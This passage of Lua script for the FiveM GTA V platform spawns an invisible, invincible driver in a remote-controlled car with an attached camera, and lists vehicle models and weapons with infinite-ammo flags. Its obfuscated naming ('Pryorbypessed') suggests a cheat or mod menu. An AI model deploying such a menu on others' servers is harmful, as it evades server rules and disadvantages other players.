	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	xlpcarmodtt.Entity = CreateVehicle(GetHashKey(RcModel), spawnCoords, spawnHeading, Pryorbypessed3)

	while not DoesEntityExist(xlpcarmodtt.Entity) do
		Citizen.Wait(5)
	end

	xlpcarmodtt.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, Pryorbypessed3)

	SetEntityInvincible(xlpcarmodtt.Driver, Pryorbypessed3)
	SetEntityVisible(xlpcarmodtt.Driver, Pryorbypessed2)
	FreezeEntityPosition(xlpcarmodtt.Driver, Pryorbypessed3)
	SetPedAlertness(xlpcarmodtt.Driver, 0.0)
	SetVehicleNumberPlateText(xlpcarmodtt.Entity, "67cnj087")
	TaskWarpPedIntoVehicle(xlpcarmodtt.Driver, xlpcarmodtt.Entity, -1)


	while not IsPedInVehicle(xlpcarmodtt.Driver, xlpcarmodtt.Entity) do
		Citizen.Wait(0)
	end

	xlpcarmodtt.Attach("place")
end

xlpcarmodtt.Attach = function(param)
	if not DoesEntityExist(xlpcarmodtt.Entity) then
		return
	end
	
	xlpcarmodtt.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(xlpcarmodtt.Entity)
	elseif param == "pick" then
		if DoesCamExist(xlpcarmodtt.Camera) then
			xlpcarmodtt.ToggleCamera(Pryorbypessed2)
		end

		xlpcarmodtt.Tablet(Pryorbypessed2)

		DeleteVehicle(xlpcarmodtt.Entity)
		DeleteEntity(xlpcarmodtt.Driver)

		xlpcarmodtt.UnloadModels()
	end
end

xlpcarmodtt.Tablet = function(boolean)
	if boolean then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(xlpcarmodtt.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(xlpcarmodtt.TabletEntity)
	end
end

ConfigCamera = Pryorbypessed3

xlpcarmodtt.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(xlpcarmodtt.Entity) then return end 
		if DoesCamExist(xlpcarmodtt.Camera) then DestroyCam(xlpcarmodtt.Camera) end
--  DEFAULT_SCRIPTED_CAMERA
		xlpcarmodtt.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", Pryorbypessed3)

		AttachCamToEntity(xlpcarmodtt.Camera, xlpcarmodtt.Entity, 0.0, -7.8, 3.4, Pryorbypessed3)

		Citizen.CreateThread(function()
			while DoesCamExist(xlpcarmodtt.Camera) do
				Citizen.Wait(5)

				SetCamRot(xlpcarmodtt.Camera, GetEntityRotation(xlpcarmodtt.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(xlpcarmodtt.Entity), Pryorbypessed3) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(xlpcarmodtt.Entity), Pryorbypessed3) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(xlpcarmodtt.Camera)
	end
end

xlpcarmodtt.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not xlpcarmodtt.CachedModels then
			xlpcarmodtt.CachedModels = {}
		end

		table.insert(xlpcarmodtt.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

xlpcarmodtt.UnloadModels = function()
	for modelIndex = 1, #xlpcarmodtt.CachedModels do
		local model = xlpcarmodtt.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end



    local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
    local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
    local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
    local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
    local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
    local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
    local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
    local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
    local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
    local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
    local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
    local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
    local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
    local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
    local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
    local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
    local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
    local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
    local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
    local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
    local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
    local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
    local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
    local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
    local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local allWeapons={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    local l_weapons={Melee={BaseballBat={id="weapon_bat",name="~r~> ~s~Baseball Bat",bInfAmmo=Pryorbypessed2,mods={}},BrokenBottle={id="weapon_bottle",name="~r~> ~s~Broken Bottle",bInfAmmo=Pryorbypessed2,mods={}},Crowbar={id="weapon_Crowbar",name="~r~> ~s~Crowbar",bInfAmmo=Pryorbypessed2,mods={}},Flashlight={id="weapon_flashlight",name="~r~> ~s~Flashlight",bInfAmmo=Pryorbypessed2,mods={}},GolfClub={id="weapon_golfclub",name="~r~> ~s~Golf Club",bInfAmmo=Pryorbypessed2,mods={}},BrassKnuckles={id="weapon_knuckle",name="~r~> ~s~Brass Knuckles",bInfAmmo=Pryorbypessed2,mods={}},Knife={id="weapon_knife",name="~r~> ~s~Knife",bInfAmmo=Pryorbypessed2,mods={}},Machete={id="weapon_machete",name="~r~> ~s~Machete",bInfAmmo=Pryorbypessed2,mods={}},Switchblade={id="weapon_switchblade",name="~r~> ~s~Switchblade",bInfAmmo=Pryorbypessed2,mods={}},Nightstick={id="weapon_nightstick",name="~r~> ~s~Nightstick",bInfAmmo=Pryorbypessed2,mods={}},BattleAxe={id="weapon_battleaxe",name="~r~> ~s~Battle Axe",bInfAmmo=Pryorbypessed2,mods={}}},Handguns={Pistol={id="weapon_pistol",name="~r~> ~s~Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},PistolMK2={id="weapon_pistol_mk2",name="~r~> ~s~Pistol MK 2",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_PISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_02"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP"},{name="~r~> ~s~Suppessor",id="COMPONENT_AT_PI_SUPP_02"}}}},CombatPistol={id="weapon_combatpistol",name="Combat Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},APPistol={id="weapon_appistol",name="AP Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_APPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_APPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},StunGun={id="weapon_stungun",name="~r~> ~s~Stun Gun",bInfAmmo=Pryorbypessed2,mods={}},Pistol50={id="weapon_pistol50",name="~r~> ~s~Pistol .50",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL50_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL50_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},SNSPistol={id="weapon_snspistol",name="~r~> ~s~SNS Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_CLIP_02"}}}},SNSPistolMkII={id="weapon_snspistol_mk2",name="~r~> ~s~SNS Pistol Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_03"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_02"},{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},HeavyPistol={id="weapon_heavypistol",name="~r~> ~s~Heavy Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},VintagePistol={id="weapon_vintagepistol",name="~r~> ~s~Vintage Pistol",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_02"}},BarrelAttachments={{"Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},FlareGun={id="weapon_flaregun",name="~r~> ~s~Flare Gun",bInfAmmo=Pryorbypessed2,mods={}},MarksmanPistol={id="weapon_marksmanpistol",name="~r~> ~s~Marksman Pistol",bInfAmmo=Pryorbypessed2,mods={}},HeavyRevolver={id="weapon_revolver",name="~r~> ~s~Heavy Revolver",bInfAmmo=Pryorbypessed2,mods={}},HeavyRevolverMkII={id="weapon_revolver_mk2",name="~r~> ~s~Heavy Revolver Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_01"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_03"}}}},DoubleActionRevolver={id="weapon_doubleaction",name="~r~> ~s~Double Action Revolver",bInfAmmo=Pryorbypessed2,mods={}},UpnAtomizer={id="weapon_raypistol",name="~r~> ~s~Up-n-Atomizer",bInfAmmo=Pryorbypessed2,mods={}}},SMG={MicroSMG={id="weapon_microsmg",name="~r~> ~s~Micro SMG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MICROSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MICROSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},SMG={id="weapon_smg",name="~r~> ~s~SMG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SMG_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},SMGMkII={id="weapon_smg_mk2",name="~r~> ~s~SMG Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS_SMG"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SB_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SB_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}}}},AssaultSMG={id="weapon_assaultsmg",name="~r~> ~s~Assault SMG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},CombatPDW={id="weapon_combatpdw",name="~r~> ~s~Combat PDW",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPDW_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPDW_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMBATPDW_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MachinePistol={id="weapon_machinepistol",name="~r~> ~s~Machine Pistol ",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_03"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},MiniSMG={id="weapon_minismg",name="~r~> ~s~Mini SMG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MINISMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MINISMG_CLIP_02"}}}},UnholyHellbringer={id="weapon_raycarbine",name="~r~> ~s~Unholy Hellbringer",bInfAmmo=Pryorbypessed2,mods={}}},Shotguns={PumpShotgun={id="weapon_pumpshotgun",name="~r~> ~s~Pump Shotgun",bInfAmmo=Pryorbypessed2,mods={Flashlight={{"name = Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> 